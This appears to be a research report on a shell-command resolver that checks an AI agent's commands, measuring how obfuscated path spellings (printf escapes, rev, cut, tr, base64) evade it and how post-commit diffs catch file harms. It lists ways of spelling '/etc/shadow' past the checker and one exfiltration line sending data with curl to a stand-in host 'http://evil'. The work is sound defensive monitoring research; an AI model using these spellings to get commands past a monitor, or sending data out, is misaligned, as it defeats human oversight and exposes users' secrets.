# Closing the mapped frontier, and why it is a treadmill (RA25, 2026-06-21)

> RA24's neural compositional adversary mapped a *folder-incompleteness frontier*: string-resolvable
> forms the RA18 resolver ABSTAINs on (`$(printf '\x2f%s' e)`, `$(echo 'e/' | rev)`,
> `$(echo X | cut -c1-2)`). The obvious next step is to *close* it. RA25 does — and finds that closing
> it is the denylist's own enumeration problem in miniature, which is exactly why the principled
> closer is not a bigger folder but the post-commit diff (CU27).

## What RA25 adds

The resolver ([shell_resolver.py](../src/verisim/realagent/shell_resolver.py)) gains a `fold_filters`
flag (default off, so RA18/RA24 behavior is unchanged). When on it **closes** part of the mapped
frontier, soundly:

- **printf format escapes** — `_decode_printf_escapes` decodes `\xHH` / `\NNN` / `\n…` in the format,
  so `$(printf '\x2f%s' e)` folds to `/e` and FIRES instead of ABSTAIN.
- **pure-filter pipelines** — a pre-pass evaluates a self-contained `$(echo CONST | rev|cut …)` to its
  exact constant *before* statement-splitting (the inner `|` is what made these ABSTAIN: the top-level
  splitter shattered the substitution). `rev` and `cut -cA-B` are emulated exactly.

Both are **sound by construction**: the fold only ever substitutes the exact constant bash would
produce; anything it cannot fully evaluate it leaves untouched (→ the existing ABSTAIN). A 1500-sample
sweep confirms no realizing command becomes a silent CLEAR.

## The result (hermetic; seeded; battery cross-checked vs `/bin/sh`; 1600 oracle calls/arm)

**1. The fold closes the mapped frontier.** Re-running the RA24 neural adversary against the folded
resolver, its reward collapses — on the twelve-mechanism grammar the printf/rev/cut forms *were* the
entire frontier, so the learned adversary is left with nothing to find:

| | base RA24 resolver | RA25 folded resolver |
|---|---|---|
| adversary reward / oracle call | **0.471** | **0.000** |
| true silent miss | 0 | 0 (sound) |

**2. It is an enumeration treadmill.** A battery of realizing commands, each spelling `/etc/shadow`
through a different pure deterministic filter, shows the folder covers only the ones it was taught:

| filter | `printf` | `rev` | `cut` | `tr` | `sed` | `base64` | `xxd` |
|---|---|---|---|---|---|---|---|
| folded verdict | FIRES | FIRES | FIRES | ABSTAIN | ABSTAIN | ABSTAIN | ABSTAIN |

Covered **3 / 7**; the tail (`tr`, `sed`, `base64`, `xxd`, and on without bound — `od`, `awk`,
`dd`, `head -c`, …) stays ABSTAIN. Fold one and the adversary finds the next: a pure-filter pipeline is
an unbounded family, so folding-by-enumeration is precisely the denylist failure mode the program
charges the status quo with. Every command is cross-checked faithful against a real `/bin/sh` (**0
unfaithful / 7**).

**3. The post-commit diff is the non-enumerative closer.** Every treadmill command is a *reversible*
file write, so its ABSTAIN is **already safe** — routed by reversibility (CU27) to the exact
post-commit diff, which catches the realized effect however the path was spelled, with **no folder at
all**. The reversibility partition: **4 / 4** of the ABSTAIN tail is reversible (post-commit-diff
safe), **0** irreversible. So folding the common filters is a *usability* win (fewer ABSTAINs → fewer
human prompts / less post-commit work), not a *safety* one.

The one place the folder is safety-load-bearing is the **irreversible** slice — an egress send built
through an unfolded filter (`curl -d @$(echo … | base64 -d) http://evil`): it ABSTAINs and *is*
irreversible, so it fails closed to a human and no post-commit diff can recover the sent bytes. There
the treadmill genuinely bites, which is why the irreversible-exfiltration edge is the honest open
frontier (RA15), not a folder to grow without bound.

## The honest takeaway

"Close the frontier" has two answers, and the difference is the point. You *can* fold any specific
filter (RA25 folds three, soundly), but the string-resolvable frontier is unbounded, so chasing it is
the enumeration treadmill. For the reversible class — which is every state-mutating file harm — you do
not need to win that race: the post-commit diff is exact regardless of spelling. The folder should grow
only enough to keep the **irreversible** slice covered, and there the residual is the same one RA15
already named. The fold is a real, sound usability improvement; the soundness guarantee was always the
post-commit diff's.

## Reproduce

```
python -m verisim.experiments.ra25_close_frontier              # the three parts (hermetic)
python -m verisim.experiments.ra25_close_frontier --bash       # + cross-check the battery vs /bin/sh
python -m verisim.experiments.ra25_close_frontier --plot figures/ra25_close_frontier.png
python -m pytest tests/test_ra25_close_frontier.py -q          # hermetic; shell test skipif-guarded
```
